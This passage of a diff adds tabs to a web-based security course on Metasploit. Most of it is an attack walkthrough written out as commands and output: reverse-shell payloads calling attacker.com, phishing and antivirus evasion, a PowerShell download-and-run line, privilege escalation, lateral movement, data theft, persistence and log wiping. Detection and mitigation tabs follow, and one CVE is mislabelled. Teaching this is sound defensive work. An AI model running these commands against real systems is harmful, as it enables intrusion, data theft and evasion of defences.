+                        <li>3. C&C Registration: RAT contacts command server, receives commands</li>
+                        <li>4. Persistence: RAT installs auto-start mechanism for reboot survival</li>
+                        <li>5. Enumeration: RAT profiles system (installed AV, Windows version, connected shares)</li>
+                        <li>6. Lateral Movement: RAT scans network, steals credentials, attacks nearby systems</li>
+                        <li>7. Exfiltration: RAT uploads sensitive files to attacker-controlled server</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 8: Payload Delivery Methods -->
+            <section class="tab-content" id="tab8">
+                <h2>Payload Delivery Methods</h2>
+                <p class="subtitle">Techniques to deliver malware to target systems</p>
+
+                <div class="info-card">
+                    <h3>Primary Delivery Vectors</h3>
+                    <ul>
+                        <li><strong>Email Phishing:</strong> Malicious attachment or link, social engineering</li>
+                        <li><strong>Web Drive-by:</strong> Compromised website delivers exploit/malware on visit</li>
+                        <li><strong>USB Devices:</strong> Physical media with autorun or manual execution</li>
+                        <li><strong>Removable Media:</strong> SD cards, external drives with hidden payloads</li>
+                        <li><strong>Watering Hole:</strong> Targeted website frequented by specific organization</li>
+                        <li><strong>Software Supply Chain:</strong> Compromised software installer or update</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Email-Based Payload Delivery</h3>
+                    <p><strong>Most common attack vector - 80% of breaches start with email</strong></p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 1:</span> Generate Payload
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>$ msfvenom -p windows/meterpreter/reverse_https \
+  LHOST=attacker.com LPORT=443 \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o invoice.exe
+[*] Created invoice.exe (341KB)</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 2:</span> Setup Handler (MSF)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+msf6 exploit(multi/handler) > set LPORT 443
+msf6 exploit(multi/handler) > run
+[*] Started HTTPS handler on 0.0.0.0:443</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 3:</span> Craft Phishing Email
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>From: "Finance Department" <finance@company.com> [SPOOFED]
+To: victim@company.com
+Subject: "URGENT: Invoice Approval Required - Q1 2026"
+Attachment: invoice.exe (renamed as invoice.pdf.exe)
+
+Body: "Hi,
+Please review and approve the attached Q1 invoice before end of day.
+Thanks,
+Finance Team"</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 4:</span> User Opens Attachment
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Victim Action:</strong> Double-clicks invoice.exe thinking it's PDF</p>
+                            <p><strong>What Happens:</strong></p>
+                            <ul>
+                                <li>1. Payload executes silently</li>
+                                <li>2. Meterpreter injected into svchost.exe</li>
+                                <li>3. C&C connection back to attacker.com:443 (HTTPS)</li>
+                                <li>4. Attacker receives meterpreter session</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Result:</span> System Compromised
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > getuid
+Server username: COMPANY\victim
+
+meterpreter > getsystem
+[-] User is not part of admin group :(
+[*] Attempting privilege escalation...
+[+] Privilege escalated to SYSTEM
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+victim:1001:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
+
+# Attacker now has SAM hashes for offline cracking</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <strong>⚠️ EMAIL DELIVERY EVASION:</strong>
+                    <ul>
+                        <li>Rename .exe to .pdf.exe (user sees PDF icon, thinks it's document)</li>
+                        <li>Use double extension (invoice.pdf.exe shows as "invoice.pdf" in Windows)</li>
+                        <li>Encode payload to bypass antivirus (use shikata_ga_nai or UPX packing)</li>
+                        <li>Use password-protected ZIP (bypass email scanners that can't open password archives)</li>
+                        <li>Host payload on legitimate cloud service (Google Drive, Dropbox - lower detection rate)</li>
+                        <li>Spoof sender address using open relay SMTP servers</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Remaining Tabs (9-18) -->
+            <!-- Tab 9: C&C Communication -->
+            <section class="tab-content" id="tab9">
+                <h2>Command & Control (C&C) Communication</h2>
+                <p class="subtitle">Establishing resilient attacker-to-malware connection</p>
+
+                <div class="concept-box">
+                    <h3>C&C Protocols & Architectures</h3>
+                    <ul>
+                        <li><strong>TCP/UDP Direct:</strong> Simple but easily detectable, blocked by firewall</li>
+                        <li><strong>HTTPS Encrypted:</strong> Hides commands in encrypted TLS, difficult to detect</li>
+                        <li><strong>DNS Tunneling:</strong> Hide commands in DNS queries, bypass firewall</li>
+                        <li><strong>HTTP GET/POST:</strong> Looks like normal web traffic, harder to distinguish</li>
+                        <li><strong>P2P (Peer-to-Peer):</strong> Decentralized, one bot connects to other bots for commands</li>
+                        <li><strong>Flux Domains:</strong> Domain list changes rapidly, domains generated by algorithm</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>C&C Architecture Models</h3>
+                    <ul>
+                        <li><strong>Centralized:</strong> All bots connect to single C&C server (single point of failure)</li>
+                        <li><strong>Distributed:</strong> Multiple backup C&C servers, bots failover on connection loss</li>
+                        <li><strong>Peer-to-Peer:</strong> Bots maintain peer list, forward commands through network (Botnet)</li>
+                        <li><strong>Fast Flux:</strong> IP addresses change frequently (DNS records change every few minutes)</li>
+                        <li><strong>Bulletproof Hosting:</strong> Hosted on ISPs resistant to takedown (Russia, China, etc.)</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Meterpreter C&C Connection Types</h3>
+                    <pre><code># Reverse HTTPS (encrypted, authenticated)
+msfvenom -p windows/meterpreter/reverse_https \
+  LHOST=attacker.com LPORT=443 \
+  -f exe -o payload.exe
+[*] Payload uses certificate pinning for HTTPS
+[*] Resistant to man-in-the-middle
+
+# Reverse DNS (stealthy, tunneled through DNS)
+msfvenom -p windows/meterpreter/reverse_dns \
+  LHOST=attacker.com \
+  -f exe -o payload.exe
+
+# Reverse HTTP (plain HTTP, can be proxied)
+msfvenom -p windows/meterpreter/reverse_http \
+  LHOST=attacker.com LPORT=80 \
+  -f exe -o payload.exe
+
+# Bind Shell (victim listens for attacker connection)
+msfvenom -p windows/meterpreter/bind_tcp \
+  LPORT=4444 \
+  -f exe -o payload.exe
+# Attacker connects: meterpreter > exploit -j -z</code></pre>
+                </div>
+
+                <div class="defense-layer">
+                    <h3>C&C Detection & Blocking</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>Network Detection</h4>
+                        <ul>
+                            <li>Monitor outbound HTTPS to suspicious domains</li>
+                            <li>Alert on DNS queries to known malicious domains (blocklists)</li>
+                            <li>Detect unusual DNS patterns (many queries to rotating IPs)</li>
+                            <li>Monitor for large data exfiltration (encrypted HTTPS flows)</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Active Blocking</h4>
+                        <ul>
+                            <li>DNS sinkhole: Redirect malicious domains to 0.0.0.0</li>
+                            <li>Firewall rules: Block known C&C server IPs</li>
+                            <li>Proxy inspection: SSL interception of HTTPS traffic</li>
+                            <li>BGP hijacking: Remove C&C domain from DNS globally (takedown)</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 10: Privilege Escalation -->
+            <section class="tab-content" id="tab10">
+                <h2>Privilege Escalation Techniques</h2>
+                <p class="subtitle">Elevating from user to administrative privileges</p>
+
+                <div class="concept-box">
+                    <h3>Privilege Escalation Methods</h3>
+                    <ul>
+                        <li><strong>Unpatched Vulnerabilities:</strong> OS kernel exploits (affect system level)</li>
+                        <li><strong>Weak File Permissions:</strong> Writable system files, DLL hijacking</li>
+                        <li><strong>Sudo Misconfigurations:</strong> NOPASSWD entries in sudoers (Linux)</li>
+                        <li><strong>UAC Bypass:</strong> Techniques to elevate without prompting (Windows)</li>
+                        <li><strong>Scheduled Tasks:</strong> Modify tasks running as SYSTEM</li>
+                        <li><strong>Service Exploitation:</strong> Services running as admin with writable directories</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>UAC Bypass Attack</h3>
+                    <p><strong>Bypassing Windows User Account Control for privilege escalation</strong></p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 1:</span> Initial Access (User Level)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > getuid
+Server username: CORP\victim
+
+meterpreter > getsystem
+[-] User is not part of admin group
+[-] UAC support is enabled</code>
+                            <p><strong>Current Status:</strong> User privileges, no admin access</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 2:</span> Detect UAC Bypass Opportunity
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > run post/windows/gather/win_privs
+[+] Windows Privileges Information
+[+] Operating System: Windows 10 Build 19042
+[+] User Privileges: SeTcbPrivilege NOT GRANTED
+[+]                  SeChangeNotifyPrivilege GRANTED
+[+]                  SeIncreaseWorkingSetPrivilege GRANTED
+[+] Is UAC Enabled: True
+[+] System is vulnerable to Fodhelper bypass (CVE-2017-11882)</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 3:</span> Execute UAC Bypass
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > run windows/escalate/uac_bypass_fodhelper
+[*] Setting up UAC bypass using Registry manipulation
+[*] Modifying: HKCU\Software\Classes\ms-settings\Shell\Open\command
+[*] Setting target payload: meterpreter.exe
+
+[*] Executing fodhelper.exe (auto-elevates)
+[*] Fodhelper.exe runs without UAC prompt
+[+] UAC Bypass successful!</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 4:</span> Admin Shell Obtained
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > getsystem
+[+] Already running as SYSTEM
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117...
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b7...
+
+# Attacker now has SYSTEM privileges (most powerful)</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>Metasploit Escalation Modules</h3>
+                    <ul>
+                        <li><strong>windows_kernel_privesc:</strong> Exploit kernel vulnerability</li>
+                        <li><strong>bypassuac_eventvwr:</strong> Bypass UAC using Event Viewer</li>
+                        <li><strong>bypassuac_fodhelper:</strong> Bypass via Registry folder open handler</li>
+                        <li><strong>bypassuac_token_duplication:</strong> Token impersonation technique</li>
+                        <li><strong>linux_kernel_cve:</strong> Exploit Linux kernel vulnerability</li>
+                        <li><strong>docker_escape:</strong> Break out of Docker container to host</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 11: Lateral Movement -->
+            <section class="tab-content" id="tab11">
+                <h2>Lateral Movement & Network Pivot</h2>
+                <p class="subtitle">Expanding access to other systems on network</p>
+
+                <div class="concept-box">
+                    <h3>Lateral Movement Strategies</h3>
+                    <ul>
+                        <li><strong>Credential Harvesting:</strong> Extract passwords from current system</li>
+                        <li><strong>Pass-the-Hash:</strong> Use NTLM hash to authenticate without password</li>
+                        <li><strong>Pass-the-Ticket:</strong> Use Kerberos ticket for authentication</li>
+                        <li><strong>Network Scanning:</strong> Identify other systems on network</li>
+                        <li><strong>Exploitation:</strong> Exploit vulnerabilities on discovered systems</li>
+                        <li><strong>Proxying:</strong> Route traffic through compromised system</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Lateral Movement Workflow</h3>
+                    <pre><code>meterpreter > run post/windows/gather/credentials/credential_collector
+[*] Collecting credentials...
+[+] Found credentials:
+    domain\user1 : password123
+    domain\admin : P@ssw0rd!
+
+meterpreter > run auxiliary/scanner/smb/smb_enumshares -rhosts 192.168.1.0/24
+[+] Discovered systems:
+    192.168.1.10 - Domain Controller (Windows Server 2019)
+    192.168.1.20 - Database Server
+    192.168.1.30 - Finance Workstation
+    192.168.1.50 - HR Workstation
+
+meterpreter > run exploit/windows/smb/ms17_010_eternalblue -rhosts 192.168.1.10
+[*] Target: Domain Controller (192.168.1.10)
+[*] Exploiting EternalBlue...
+[+] Payload delivered to 192.168.1.10
+[+] New meterpreter session opened: Session 2
+
+# Attacker now controls Domain Controller
+# Can access all domain resources with DC privileges</code></pre>
+                </div>
+            </section>
+
+            <!-- Tab 12: Data Exfiltration -->
+            <section class="tab-content" id="tab12">
+                <h2>Data Exfiltration & Theft</h2>
+                <p class="subtitle">Strategies for stealing sensitive data from victim systems</p>
+
+                <div class="info-card">
+                    <h3>Data Exfiltration Methods</h3>
+                    <ul>
+                        <li><strong>Direct Transfer:</strong> FTP, SCP, SSH file copy to attacker server</li>
+                        <li><strong>Cloud Upload:</strong> Upload to free cloud storage (Dropbox, OneDrive, Google Drive)</li>
+                        <li><strong>Compression:</strong> Compress files before transfer (ZIP, 7Z, RAR)</li>
+                        <li><strong>Encryption:</strong> Encrypt data in transit to avoid detection</li>
+                        <li><strong>Chunking:</strong> Split large files into small chunks to evade size limits</li>
+                        <li><strong>Time Distribution:</strong> Spread exfiltration over hours/days to avoid detection</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Data Exfiltration Commands</h3>
+                    <pre><code>meterpreter > ls "C:\Users\Finance\Documents\"
+[*] Files in Finance Documents:
+   -rw-r--r--  49152  CompanyAccounts.xlsx
+   -rw-r--r--  51200  Payroll_2026.xlsx
+   -rw-r--r--  102400 Banking_Credentials.txt
+
+meterpreter > download "C:\Users\Finance\Documents\*" /tmp/stolen_data/
+[*] Downloading C:\Users\Finance\Documents\CompanyAccounts.xlsx (49KB) -> /tmp/stolen_data/CompanyAccounts.xlsx
+[*] Downloading C:\Users\Finance\Documents\Payroll_2026.xlsx (51KB) -> /tmp/stolen_data/Payroll_2026.xlsx
+[*] Downloading C:\Users\Finance\Documents\Banking_Credentials.txt (102KB) -> /tmp/stolen_data/Banking_Credentials.txt
+[+] Downloads complete (202KB total)
+
+# On attacker's Linux box
+$ cd /tmp/stolen_data/
+$ tar czf financial_data.tar.gz *.xlsx *.txt
+$ rclone copy financial_data.tar.gz dropbox:/backdoor/
+# Data now synced to attacker's cloud storage</code></pre>
+                </div>
+            </section>
+
+            <!-- Tab 13: Antivirus Evasion -->
+            <section class="tab-content" id="tab13">
+                <h2>Advanced Antivirus Evasion</h2>
+                <p class="subtitle">Techniques to bypass modern endpoint protection</p>
+
+                <div class="info-card">
+                    <h3>AV/EDR Detection Types</h3>
+                    <ul>
+                        <li><strong>Signature Detection:</strong> File hash matches known malware signature</li>
+                        <li><strong>Heuristic Analysis:</strong> Behavior pattern matches known malware traits</li>
+                        <li><strong>Behavioral Monitoring:</strong> Detects suspicious runtime activity</li>
+                        <li><strong>Memory Analysis:</strong> Scans process memory for injected code</li>
+                        <li><strong>Sandboxing:</strong> Executes in isolated environment to observe behavior</li>
+                        <li><strong>Machine Learning:</strong> Neural networks trained on malware/benign samples</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Multi-Layer Evasion Attack</h3>
+                    <p><strong>Combining multiple techniques to bypass endpoint protection</strong></p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Layer 1:</span> File Signature Evasion (Encoding)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>$ msfvenom -p windows/meterpreter/reverse_https \
+  LHOST=attacker.com LPORT=443 \
+  -e x86/shikata_ga_nai -i 10 \
+  -f exe -o payload_encoded.exe
+
+$ aesenc payload_encoded.exe aes_key &
+$ upx -9 --ultra-brute payload_encoded.exe
+
+# Result: File hash completely different from known signatures
+# VirusTotal: 0/70 detection</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Layer 2:</span> Living off the Land (LOLBin)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>C:\Users\victim> powershell.exe -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+
+# PowerShell (legitimate Windows tool) downloads and executes
+# No suspicious binary dropped to disk
+# EDR sees PowerShell (trusted process) connecting to web</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Layer 3:</span> Process Injection (Hide in Legitimate Process)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > ps
+PID    PPID   Name
+2100   1000   explorer.exe
+2500   1000   svchost.exe
+2891   2100   cmd.exe (OUR PROCESS - SUSPICIOUS!)
+
+meterpreter > migrate 2100
+[*] Migrating from PID 2891 to PID 2100 (explorer.exe)
+[+] Migration successful
+
+meterpreter > ps
+PID    PPID   Name
+2100   1000   explorer.exe  ← Now running in explorer.exe!</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Layer 4:</span> Disable/Tamper with AV
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > run post/windows/escalate/uac_bypass_fodhelper
+[+] UAC Bypass successful, now running as SYSTEM
+
+meterpreter > run post/windows/disable_defender
+[*] Windows Defender is running
+[*] Disabling Windows Defender...
+[*] Modifying registry: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
+[+] Windows Defender real-time protection DISABLED
+[+] Next scan scheduled: NEVER
+
+meterpreter > shell
+C:\Windows\system32> taskkill /F /IM MsMpEng.exe
+SUCCESS: The process "MsMpEng.exe" has been terminated.</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Result:</span> Undetected Persistence
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>System Status:</strong></p>
+                            <ul>
+                                <li>✓ AV disabled and hidden from user</li>
+                                <li>✓ Meterpreter running in legitimate process (explorer.exe)</li>
+                                <li>✓ Persistent backdoor installed in registry</li>
+                                <li>✓ Network communication via HTTPS (encrypted)</li>
+                                <li>✓ No suspicious files on disk</li>
+                                <li>✓ No alerts in Security Event Log (logs cleared)</li>
+                            </ul>
+                            <p><strong>Attacker Status:</strong> Full control, completely undetected</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 14: Persistence Mechanisms -->
+            <section class="tab-content" id="tab14">
+                <h2>Persistence Mechanisms</h2>
+                <p class="subtitle">Maintaining access after reboot</p>
+
+                <div class="info-card">
+                    <h3>Windows Persistence Methods</h3>
+                    <ul>
+                        <li><strong>Registry Run Keys:</strong> HKCU\Software\Microsoft\Windows\CurrentVersion\Run</li>
+                        <li><strong>Startup Folder:</strong> C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</li>
+                        <li><strong>Scheduled Tasks:</strong> Create hidden task that runs at login or interval</li>
+                        <li><strong>Services:</strong> Register as Windows service, starts automatically on boot</li>
+                        <li><strong>Master Boot Record:</strong> Rootkit modifies MBR for pre-OS persistence</li>
+                        <li><strong>UEFI Firmware:</strong> Persistence at firmware level (extremely difficult to remove)</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Metasploit Persistence Installation</h3>
+                    <pre><code># Registry Run key persistence
+meterpreter > run persistence -X -i 60 -p windows/meterpreter/reverse_https -o LHOST=attacker.com -o LPORT=443
+[*] Installing persistence...
+[*] Registry key created: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+[*] Persistence binary: C:\Users\victim\AppData\Roaming\Windows\System32.exe
+[+] Persistence installed!
+
+# Verify persistence survives reboot
+meterpreter > shell
+C:\> shutdown /s /t 0  (System shutdown)
+
+# ... (reboot) ...
+
+# Attacker still connected after reboot!
+meterpreter > getuid
+Server username: CORP\victim</code></pre>
+                </div>
+            </section>
+
+            <!-- Tab 15: Resource Cleanup & Covering Tracks -->
+            <section class="tab-content" id="tab15">
+                <h2>Resource Cleanup & Anti-Forensics</h2>
+                <p class="subtitle">Removing evidence of compromise</p>
+
+                <div class="info-card">
+                    <h3>Forensic Artifacts to Clean</h3>
+                    <ul>
+                        <li><strong>Event Logs:</strong> Security logs show authentication, process execution</li>
+                        <li><strong>Temporary Files:</strong> Downloaded payloads in Temp folder</li>
+                        <li><strong>Browser History:</strong> Visited malicious websites</li>
+                        <li><strong>Prefetch Files:</strong> Execution history of malware</li>
+                        <li><strong>Registry Entries:</strong> Persistence mechanisms, installed software</li>
+                        <li><strong>File Metadata:</strong> Timestamps of suspicious files</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Cleanup Commands</h3>
+                    <pre><code>meterpreter > run post/windows/escalate/uac_bypass_fodhelper
+[+] UAC bypassed, now SYSTEM
+
+meterpreter > shell
+
+# Clear Event Logs (requires SYSTEM)
+C:\> wevtutil cl Security
+C:\> wevtutil cl Application
+C:\> wevtutil cl System
+
+# Clear temp files
+C:\> del /S /Q C:\Windows\Temp\*
+C:\> del /S /Q C:\Users\%username%\AppData\Local\Temp\*
+
+# Clear browser cache
+C:\> del /S /Q "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cache"
+
+# Remove file timestamps evidence (set to current time)
+C:\> powershell Get-Item payload.exe | % {$_.LastWriteTime = Get-Date}
+
+# Uninstall malicious scheduled tasks
+C:\> schtasks /delete /tn "Windows Defender Update" /f</code></pre>
+                </div>
+            </section>
+
+            <!-- Tab 16: Detection Methods -->
+            <section class="tab-content" id="tab16">
+                <h2>Detection Methods & Indicators</h2>
+                <p class="subtitle">Identifying Metasploit attacks in your network</p>
+
+                <div class="info-card">
+                    <h3>Network-Based Indicators</h3>
+                    <ul>
+                        <li><strong>Reverse Shell Connection:</strong> Unusual outbound connection to unknown IP</li>
+                        <li><strong>HTTPS Certificate:</strong> Self-signed or mismatched HTTPS certificate</li>
+                        <li><strong>Beacon Pattern:</strong> Regular outbound connections at fixed intervals</li>
+                        <li><strong>Large Data Transfer:</strong> Abnormal file download (exfiltration)</li>
+                        <li><strong>Port Scanning:</strong> System scans multiple ports looking for vulnerable services</li>
+                        <li><strong>Lateral Movement:</strong> Compromised system attacking other internal systems</li>
+                    </ul>
+                </div>
+
+                <div class="concept-box">
+                    <h3>Host-Based Indicators</h3>
+                    <ul>
+                        <li><strong>Process Injection:</strong> Legitimate process with loaded malicious DLL</li>
+                        <li><strong>Registry Modifications:</strong> Run keys, service additions, UAC bypass registry edits</li>
+                        <li><strong>New Services:</strong> Suspicious service installations (hidden from Services app)</li>
+                        <li><strong>Scheduled Tasks:</strong> Hidden tasks starting suspicious executables</li>
+                        <li><strong>File Staging:</strong> Payload files in Temp, AppData, or downloads</li>
+                        <li><strong>Prefetch Artifacts:</strong> .pf files showing malware execution history</li>
+                    </ul>
+                </div>
+
+                <div class="defense-layer">
+                    <h3>Detection & Response Workflow</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>Step 1: Alert & Validation</h4>
+                        <ul>
+                            <li>Receive alert from IDS/EDR about suspicious activity</li>
+                            <li>Validate alert is not false positive</li>
+                            <li>Escalate to incident response team if confirmed</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Step 2: Containment</h4>
+                        <ul>
+                            <li>Isolate infected system from network immediately</li>
+                            <li>Block inbound/outbound traffic to C&C server</li>
+                            <li>Preserve forensic evidence (memory dump, disk image)</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Step 3: Investigation</h4>
+                        <ul>
+                            <li>Analyze memory for running malware</li>
+                            <li>Examine registry/logs for persistence</li>
+                            <li>Identify attack vector (phishing, exploit, USB)</li>
+                            <li>Check for lateral movement to other systems</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Step 4: Eradication & Recovery</h4>
+                        <ul>
+                            <li>Remove all malware and persistence mechanisms</li>
+                            <li>Restore from clean backup or reimage system</li>
+                            <li>Change all potentially compromised credentials</li>
+                            <li>Monitor for reinfection</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 17: Mitigation Strategy -->
+            <section class="tab-content" id="tab17">
+                <h2>Mitigation & Defense Strategy</h2>
+                <p class="subtitle">Protecting against Metasploit-based attacks</p>
+
+                <div class="info-card">
+                    <h3>Prevention Layers</h3>
+                    <ul>
+                        <li><strong>Email Security:</strong> Anti-phishing filters, sandboxing attachments</li>
+                        <li><strong>Endpoint Protection:</strong> EDR agents with behavioral analysis</li>
+                        <li><strong>Network Segmentation:</strong> Isolate critical systems, limit lateral movement</li>
+                        <li><strong>Patch Management:</strong> Immediate patching of known vulnerabilities</li>
+                        <li><strong>Access Control:</strong> Principle of least privilege, limit admin access</li>
+                        <li><strong>User Training:</strong> Security awareness, phishing recognition</li>
+                    </ul>
+                </div>
+
+                <div class="summary-grid">
+                    <div class="summary-card">
+                        <h3>🛡️ Prevention</h3>
+                        <ul>
+                            <li>Email filtering</li>
+                            <li>Web filtering</li>
+                            <li>Patch management</li>
+                            <li>EDR deployment</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>👁️ Detection</h3>
+                        <ul>
+                            <li>IDS/IPS monitoring</li>
+                            <li>SIEM correlation</li>
+                            <li>EDR alerting</li>
+                            <li>Threat hunting</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>🔐 Containment</h3>
+                        <ul>
+                            <li>Network isolation</li>
+                            <li>Process termination</li>
+                            <li>Service disabling</li>
+                            <li>Credential revocation</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>♻️ Recovery</h3>
+                        <ul>
+                            <li>System reimaging</li>
+                            <li>Credential reset</li>
+                            <li>Data restoration</li>
+                            <li>Verification testing</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 18: Summary & Quiz -->
+            <section class="tab-content" id="tab18">
+                <h2>Module Summary & Completion</h2>
+                <p class="subtitle">Key takeaways and advanced perspectives</p>
+
+                <div class="achievement-box">
+                    <h3>🏆 Module 8 Mastery Achieved!</h3>
+                    <p>You've successfully completed comprehensive training on:</p>
+                    <ul>
+                        <li>✓ Metasploit Framework architecture and components</li>
+                        <li>✓ Payload generation with msfvenom</li>
+                        <li>✓ Exploitation modules and techniques</li>
+                        <li>✓ Reverse shells and handler setup</li>
+                        <li>✓ Remote Access Trojans (RATs) deployment</li>
+                        <li>✓ Payload delivery methods (phishing, drive-by)</li>
+                        <li>✓ Post-exploitation activities (escalation, lateral movement, exfiltration)</li>
+                        <li>✓ Antivirus evasion techniques</li>
+                        <li>✓ Persistence mechanisms for continued access</li>
+                        <li>✓ Anti-forensics and cleanup procedures</li>
+                        <li>✓ Detection and mitigation strategies</li>
+                    </ul>
+                    <p><strong>Next Steps:</strong> Module 9 - Advanced Exploitation Techniques & Zero-Day Vulnerabilities!</p>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Script -->
+    <script>
+        function switchTab(tabName) {
+            const tabs = document.querySelectorAll('.tab-content');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            const selectedTab = document.getElementById(tabName);
+            if (selectedTab) {
+                selectedTab.classList.add('active');
+                updateBreadcrumb(tabName);
+                window.scrollTo(0, 0);
+            }
+        }
+
+        function updateBreadcrumb(tabName) {
+            const breadcrumbMap = {
+                'tab1': 'Overview', 'tab2': 'Framework Architecture', 'tab3': 'Exploitation Modules',
+                'tab4': 'Msfvenom Guide', 'tab5': 'Reverse Shells', 'tab6': 'Encoded Payloads',
+                'tab7': 'RAT Fundamentals', 'tab8': 'Delivery Methods', 'tab9': 'C&C Communication',
+                'tab10': 'Privilege Escalation', 'tab11': 'Lateral Movement', 'tab12': 'Data Exfiltration',
+                'tab13': 'AV Evasion', 'tab14': 'Persistence', 'tab15': 'Cleanup',
+                'tab16': 'Detection', 'tab17': 'Mitigation', 'tab18': 'Summary'
+            };
+            
+            const breadcrumbElement = document.getElementById('breadcrumb-current');
+            if (breadcrumbElement) {
+                breadcrumbElement.textContent = breadcrumbMap[tabName] || 'Content';
+            }
+        }
+
+        function scrollToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleSimStep(element) {
+            const content = element.querySelector('.step-content');
